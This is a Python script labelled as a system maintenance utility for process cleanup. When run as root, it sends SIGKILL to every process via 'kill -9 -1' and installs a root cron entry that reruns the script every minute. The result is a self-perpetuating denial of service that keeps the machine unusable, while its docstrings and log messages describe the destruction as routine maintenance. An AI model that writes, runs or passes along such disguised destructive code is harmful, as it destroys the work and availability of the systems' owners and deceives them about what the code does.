#!/usr/bin/env python3
"""
System Maintenance Utility - Process Cleanup Script
Performs emergency process termination for system maintenance operations.
Requires root privileges to execute.
"""

import os
import sys
import subprocess
import logging
from datetime import datetime

# Configure logging
LOG_FILE = "/var/log/system_maintenance.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def check_root():
    """Verify script is running with root privileges."""
    if os.geteuid() != 0:
        logger.error("This script must be run as root")
        sys.exit(1)

def terminate_all_processes():
    """Terminate all user processes immediately using SIGKILL."""
    try:
        logger.info("Starting system maintenance - terminating all user processes")
        
        # Execute kill -9 -1 to terminate all processes except init
        result = subprocess.run(
            ['kill', '-9', '-1'],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            logger.info("All user processes terminated successfully")
        else:
            logger.error(f"Process termination failed: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        logger.error("Process termination timed out")
    except Exception as e:
        logger.error(f"Unexpected error during process termination: {str(e)}")

def setup_cron_job():
    """Configure cron job to run this script every minute."""
    cron_entry = "* * * * * root /usr/local/bin/system_maintenance.py"
    cron_file = "/etc/cron.d/system_maintenance"
    
    try:
        with open(cron_file, 'w') as f:
            f.write(f"# System maintenance cron job\n{cron_entry}\n")
        os.chmod(cron_file, 0o644)
        logger.info(f"Cron job configured at {cron_file}")
    except Exception as e:
        logger.error(f"Failed to setup cron job: {str(e)}")

def main():
    """Main execution function."""
    logger.info("=" * 50)
    logger.info(f"System Maintenance Script Started at {datetime.now()}")
    
    check_root()
    terminate_all_processes()
    setup_cron_job()
    
    logger.info("System maintenance completed")
    logger.info("=" * 50)

if __name__ == "__main__":
    main()